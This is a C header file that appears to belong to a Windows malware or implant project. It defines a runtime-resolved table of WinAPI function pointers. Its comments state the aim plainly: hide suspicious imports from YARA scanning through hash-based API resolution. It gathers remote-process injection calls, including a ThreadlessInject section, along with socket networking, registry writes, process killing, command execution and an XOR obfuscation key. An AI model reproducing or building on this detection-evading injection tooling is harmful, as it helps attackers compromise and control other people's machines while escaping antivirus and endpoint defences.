// ============================================================================
// api_table.h — Runtime-resolved WinAPI Function Pointer Table
// ============================================================================
// All WinAPI functions are resolved at runtime via resolveApiByHash().
// The compiled PE's IAT contains ZERO suspicious WinAPI entries — every
// YARA rule that scans the import table comes up empty.
//
// Global instance: g_api  (defined in main.cpp, declared extern here)
// ============================================================================
#pragma once

#ifdef _WIN32
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <shellapi.h>

// Kernel32 function pointer types
typedef HANDLE (WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef HANDLE (WINAPI *pCreateFileMappingA)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID (WINAPI *pMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL   (WINAPI *pUnmapViewOfFile)(LPCVOID);
typedef BOOL   (WINAPI *pCloseHandle)(HANDLE);
typedef BOOL   (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL   (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);

// Global API table struct — all WinAPI pointers resolved at runtime
typedef struct _ApiTable {
    // Network (ws2_32 — loaded at init)
    int      (WINAPI *WSAStartup)(WORD, LPWSADATA);
    int      (WINAPI *WSACleanup)(void);
    int      (WINAPI *closesocket)(SOCKET);
    SOCKET   (WINAPI *socket)(int, int, int);
    int      (WINAPI *connect)(SOCKET, const struct sockaddr*, int);
    int      (WINAPI *send)(SOCKET, const char*, int, int);
    int      (WINAPI *recv)(SOCKET, char*, int, int);
    u_short  (WINAPI *htons)(u_short);
    int      (WINAPI *inet_pton)(int, const char*, void*);

    // Registry (advapi32)
    LONG     (WINAPI *RegCreateKeyExA)(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, PDWORD);
    LONG     (WINAPI *RegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
    LONG     (WINAPI *RegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
    LONG     (WINAPI *RegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
    LONG     (WINAPI *RegCloseKey)(HKEY);
    LONG     (WINAPI *RegDeleteKeyExA)(HKEY, LPCSTR, REGSAM, DWORD);

    // Kernel32 core
    HANDLE   (WINAPI *CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    HANDLE   (WINAPI *CreateFileMappingA)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
    LPVOID   (WINAPI *MapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
    BOOL     (WINAPI *UnmapViewOfFile)(LPCVOID);
    BOOL     (WINAPI *CloseHandle)(HANDLE);
    BOOL     (WINAPI *VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
    BOOL     (WINAPI *WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
    BOOL     (WINAPI *CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
    HANDLE   (WINAPI *OpenProcess)(DWORD, BOOL, DWORD);
    BOOL     (WINAPI *TerminateProcess)(HANDLE, UINT);
    BOOL     (WINAPI *VirtualFreeEx)(HANDLE, LPVOID, SIZE_T, DWORD);
    LPVOID   (WINAPI *VirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    BOOL     (WINAPI *VirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
    DWORD    (WINAPI *WaitForSingleObject)(HANDLE, DWORD);
    HANDLE   (WINAPI *CreateToolhelp32Snapshot)(DWORD, DWORD);
    BOOL     (WINAPI *Process32FirstW)(HANDLE, LPPROCESSENTRY32W);
    BOOL     (WINAPI *Process32NextW)(HANDLE, LPPROCESSENTRY32W);
    HANDLE   (WINAPI *GetProcessHeap)(void);
    LPVOID   (WINAPI *HeapAlloc)(HANDLE, DWORD, SIZE_T);
    BOOL     (WINAPI *HeapFree)(HANDLE, DWORD, LPVOID);
    DWORD    (WINAPI *GetModuleFileNameA)(HMODULE, LPSTR, DWORD);
    BOOL     (WINAPI *DeleteFileA)(LPCSTR);
    BOOL     (WINAPI *MoveFileA)(LPCSTR, LPCSTR);
    BOOL     (WINAPI *MoveFileExA)(LPCSTR, LPCSTR, DWORD);
    DWORD    (WINAPI *pGetLastError)(void);  // Renamed: GetLastError is a #define macro on Windows
    BOOL     (WINAPI *GetUserNameA)(LPSTR, LPDWORD);
    UINT     (WINAPI *WinExec)(LPCSTR, UINT);
    HMODULE  (WINAPI *LoadLibraryA)(LPCSTR);
    BOOL     (WINAPI *FreeLibrary)(HMODULE);
    DWORD    (WINAPI *GetCurrentProcessId)(void);
    DWORD    (WINAPI *GetCurrentThreadId)(void);
    void     (WINAPI *Sleep)(DWORD);
    BOOL     (WINAPI *ShellExecuteExA)(LPSHELLEXECUTEINFOA);
    BOOL     (WINAPI *InitializeProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
    BOOL     (WINAPI *DeleteProcThreadAttributeList)(LPPROC_THREAD_ATTRIBUTE_LIST);
    BOOL     (WINAPI *UpdateProcThreadAttribute)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PVOID);

    // ThreadlessInject所需的额外kernel32函数
    BOOL     (WINAPI *ReadProcessMemory)(HANDLE, LPCVOID, LPVOID, SIZE_T, SIZE_T*);
    HMODULE  (WINAPI *GetModuleHandleA)(LPCSTR);
    FARPROC  (WINAPI *GetProcAddress)(HMODULE, LPCSTR);
    int      (WINAPI *MultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
    BOOL     (WINAPI *FlushInstructionCache)(HANDLE, LPCVOID, SIZE_T);
} ApiTable;

// Global API table — defined in main.cpp
extern ApiTable g_api;
extern bool g_api_initialized;

// Initialize all API function pointers at runtime via hash resolution
bool initApiTable();

// XOR obfuscation key (cross-platform)
#define XOR_KEY 0x55

#else
// Non-Windows: empty stubs
typedef int ApiTable;
#define XOR_KEY 0x55
#endif // _WIN32
